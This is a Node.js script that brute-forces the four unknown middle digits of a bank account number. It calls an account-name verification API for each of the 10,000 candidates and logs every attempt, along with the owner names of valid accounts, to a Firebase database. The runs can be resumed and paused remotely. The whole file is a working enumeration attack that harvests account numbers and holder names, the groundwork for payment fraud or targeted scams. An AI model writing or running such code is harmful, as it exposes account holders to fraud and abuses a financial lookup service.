import axios from 'axios';
import fs from 'fs';
import admin from 'firebase-admin';
import chalk from 'chalk';
import prettyMs from 'pretty-ms';

// Load Firebase service account key from environment variable
const serviceAccount = JSON.parse(process.env.FIREBASE_KEY_JSON);

// Initialize Firebase Admin SDK
admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
  databaseURL: 'https://a-b-c-s-default-rtdb.firebaseio.com',
});

// Firebase references
const db = admin.database();
const attemptsRef = db.ref('Attempt');
const validRef = db.ref('Valid Account');
const controlRef = db.ref('control');

// Load env variables
const BANK_CODE = process.env.BANK_CODE;
const API_URL = process.env.API_URL;
const TOKEN = process.env.API_TOKEN;

// ✅ Your known digits
const FIRST3 = '217';
const LAST3 = '281';

// Brute-force 0000 to 9999
let start = 0;
let stop = false;

// Load previous progress
if (fs.existsSync('state.json')) {
  const state = JSON.parse(fs.readFileSync('state.json', 'utf8'));
  start = state.last || 0;
}

// Listen for control commands from Firebase
controlRef.child('status').on('value', snapshot => {
  stop = snapshot.val() === 'stop';
});

async function bruteForce() {
  console.log(chalk.green(`\n🚀 Starting from middle: ${start.toString().padStart(4, '0')}`));
  const startTime = Date.now();

  for (let i = start; i <= 9999; i++) {
    if (stop) {
      console.log(chalk.yellow('⏸️ Paused by Firebase control.'));
      saveState(i);
      break;
    }

    const middle = i.toString().padStart(4, '0');
    const accountNumber = `${FIRST3}${middle}${LAST3}`;
    const timestamp = new Date().toISOString();

    try {
      const res = await axios.get(`${API_URL}?account_number=${accountNumber}&bank_code=${BANK_CODE}`, {
        headers: { Authorization: `Bearer ${TOKEN}` }
      });

      const data = res.data;
      await attemptsRef.push({ timestamp, accountNumber, data });

      if (data.status === 200 && data.account_name) {
        await validRef.push({ timestamp, accountNumber, ...data });
        console.log(chalk.green(`[VALID] ${accountNumber} → ${data.account_name}`));
      } else {
        console.log(chalk.gray(`[INVALID] ${accountNumber}`));
      }

    } catch (err) {
      console.log(chalk.red(`[ERROR] ${accountNumber} → Retrying...`));
      i--; // retry same number
    }

    if (i % 50 === 0) saveState(i);
  }

  const duration = Date.now() - startTime;
  console.log(chalk.blueBright(`\n🎯 Finished in ${prettyMs(duration)}.`));
}

// Save progress locally
function saveState(last) {
  fs.writeFileSync('state.json', JSON.stringify({ last }), 'utf8');
}

// Start the script
bruteForce();
